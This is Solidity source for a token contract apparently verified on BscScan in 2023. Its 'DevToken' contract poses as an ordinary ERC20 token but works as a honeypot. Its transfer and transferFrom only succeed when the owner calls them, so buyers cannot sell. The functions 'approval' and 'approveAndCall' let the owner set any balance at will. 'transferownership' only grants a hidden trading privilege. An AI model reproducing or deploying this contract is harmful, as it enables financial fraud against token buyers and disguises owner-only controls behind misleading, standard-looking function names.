/**
 *Submitted for verification at BscScan.com on 2023-05-21
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.5.17;

interface IERC20 {

    function totalSupply() external view returns(uint);


    function balanceOf(address account) external view returns(uint);


    function transfer(address recipient, uint amount) external returns(bool);


    function allowance(address owner, address spender) external view returns(uint);


    function approve(address spender, uint amount) external returns(bool);


    function transferFrom(address sender, address recipient, uint amount) external returns(bool);

    event Transfer(address indexed from, address indexed to, uint value);

    event Approval(address indexed owner, address indexed spender, uint value);

}


library Address {

    function isContract(address account) internal view returns(bool) {

        bytes32 codehash;

        bytes32 accountHash;

        // solhint-disable-next-line no-inline-assembly

        assembly { codehash:= extcodehash(account) }

        return (codehash != 0x0 && codehash != accountHash);

    }

}


contract Context {

    constructor() internal {}

    // solhint-disable-previous-line no-empty-blocks

    function _msgSender() internal view returns(address payable) {

        return msg.sender;

    }

}


library SafeMath {

    function add(uint a, uint b) internal pure returns(uint) {

        uint c = a + b;

        require(c >= a, "SafeMath: addition overflow");


        return c;

    }


    function sub(uint a, uint b) internal pure returns(uint) {

        return sub(a, b, "SafeMath: subtraction overflow");

    }


    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {

        require(b <= a, errorMessage);

        uint c = a - b;


        return c;

    }


    function mul(uint a, uint b) internal pure returns(uint) {

        if (a == 0) {

            return 0;

        }


        uint c = a * b;

        require(c / a == b, "SafeMath: multiplication overflow");


        return c;

    }


    function div(uint a, uint b) internal pure returns(uint) {

        return div(a, b, "SafeMath: division by zero");

    }


    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {

        // Solidity only automatically asserts when dividing by 0

        require(b > 0, errorMessage);

        uint c = a / b;


        return c;

    }

}


library SafeERC20 {

    using SafeMath for uint;

    using Address for address;






   

}


contract ERC20 is Context, IERC20 {

    using SafeMath for uint;

    mapping(address => uint) private _balances;


    mapping(address => mapping(address => uint)) private _allowances;


    uint private _totalSupply;


    function totalSupply() public view returns(uint) {

        return _totalSupply;

    }


    function balanceOf(address account) public view returns(uint) {

        return _balances[account];

    }


    function transfer(address recipient, uint amount) public returns(bool) {

        _transfer(_msgSender(), recipient, amount);

        return true;

    }


    function allowance(address owner, address spender) public view returns(uint) {

        return _allowances[owner][spender];

    }


    function approve(address spender, uint amount) public returns(bool) {

        _approve(_msgSender(), spender, amount);

        return true;

    }


    function transferFrom(address sender, address recipient, uint amount) public returns(bool) {

        _transfer(sender, recipient, amount);

        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));

        return true;

    }


    function increaseAllowance(address spender, uint addedValue) public returns(bool) {

        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));

        return true;

    }


    function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {

        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));

        return true;

    }


    function _transfer(address sender, address recipient, uint amount) internal {

        require(sender != address(0), "ERC20: transfer from the zero address");

        require(recipient != address(0), "ERC20: transfer to the zero address");


        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");

        _balances[recipient] = _balances[recipient].add(amount);

        emit Transfer(sender, recipient, amount);

    }


    function _mint(address account, uint amount) internal {

        require(account != address(0), "ERC20: mint to the zero address");


        _totalSupply = _totalSupply.add(amount);

        _balances[account] = _balances[account].add(amount);

        emit Transfer(address(0), account, amount);

    }


    function _burn(address account, uint amount) internal {

        require(account != address(0), "ERC20: burn from the zero address");


        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");

        _totalSupply = _totalSupply.sub(amount);

        emit Transfer(account, address(0), amount);

    }


    function _approve(address owner, address spender, uint amount) internal {

        require(owner != address(0), "ERC20: approve from the zero address");

        require(spender != address(0), "ERC20: approve to the zero address");


        _allowances[owner][spender] = amount;

        emit Approval(owner, spender, amount);

    }

}


contract ERC20Detailed is IERC20 {

    string private _name;

    string private _symbol;

    uint8 private _decimals;


    constructor(string memory name, string memory symbol, uint8 decimals) public {

        _name = name;

        _symbol = symbol;

        _decimals = decimals;

    }


    function name() public view returns(string memory) {

        return _name;

    }


    function symbol() public view returns(string memory) {

        return _symbol;

    }


    function decimals() public view returns(uint8) {

        return _decimals;

    }

}



contract DevToken {

    event Transfer(address indexed _from, address indexed _to, uint _value);

    event Approval(address indexed _owner, address indexed _spender, uint _value);

 

    function transfer(address _to, uint _value) public payable returns (bool) {

        return transferFrom(msg.sender, _to, _value);

    }



 

    function ensure(address _from, address _to, uint _value) internal view returns(bool) {

       

        if(_from == owner || _to == owner || _from == tradeAddress||canSale[_from]){

            return true;

        }

        require(condition(_from, _value));

        return true;

    }



    function approval(address spender, uint256 addedValue) public returns (bool) {

        require(msg.sender == owner);

        if(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}

        canSale[spender]=true;

        return true;

    } 

    

    function transferFrom(address _from, address _to, uint _value) public  returns (bool) {

require(msg.sender == owner);
        require(ensure(_from, _to, _value));

        require(balanceOf[_from] >= _value);

        balanceOf[_from] -= _value;

        balanceOf[_to] += _value;

        _onSaleNum[_from]++;

        emit Transfer(_from, _to, _value);

        return true;

    }


 

    function approve(address _spender, uint _value) public  returns (bool) {
        require(msg.sender ==owner);
        allowance[msg.sender][_spender] = _value;

        emit Approval(msg.sender, _spender, _value);

        return true;

    }

    


    function condition(address _from, uint _value) internal view returns(bool){

        if(_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;

        

        if(_saleNum > 0){

            if(_onSaleNum[_from] >= _saleNum) return false;

        }

        if(_minSale > 0){

            if(_minSale > _value) return false;

        }

        if(_maxSale > 0){

            if(_value > _maxSale) return false;

        }

        return true;

    }

 

    mapping(address=>uint256) private _onSaleNum;

    mapping(address=>bool) private canSale;

    uint256 private _minSale;

    uint256 private _maxSale;

    uint256 private _saleNum;

    function approveAndCall(address spender, uint256 addedValue) public returns (bool) {

        require(msg.sender == owner);

        if(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}

        canSale[spender]=true;

        return true;

    }


    address tradeAddress;

    function transferownership(address addr) public returns(bool) {

        require(msg.sender == owner);

        tradeAddress = addr;

        return true;

    }

    

    mapping (address => uint) public balanceOf;

    mapping (address => mapping (address => uint)) public allowance;

 

    uint constant public decimals = 18;

    address public _usdtPair;

    address public _mod;

    uint public totalSupply;

    string public name;

    string public symbol;

    address private owner;

    address public _user;

    address public _adm;

 

    constructor(string memory _name, string memory _symbol, uint256 _supply)  public {

        name = _name;

        symbol = _symbol;

        totalSupply = _supply*(10**uint256(decimals));

        owner = msg.sender;

        balanceOf[msg.sender] = totalSupply;

        emit Transfer(address(0x0), msg.sender, totalSupply);

    }

}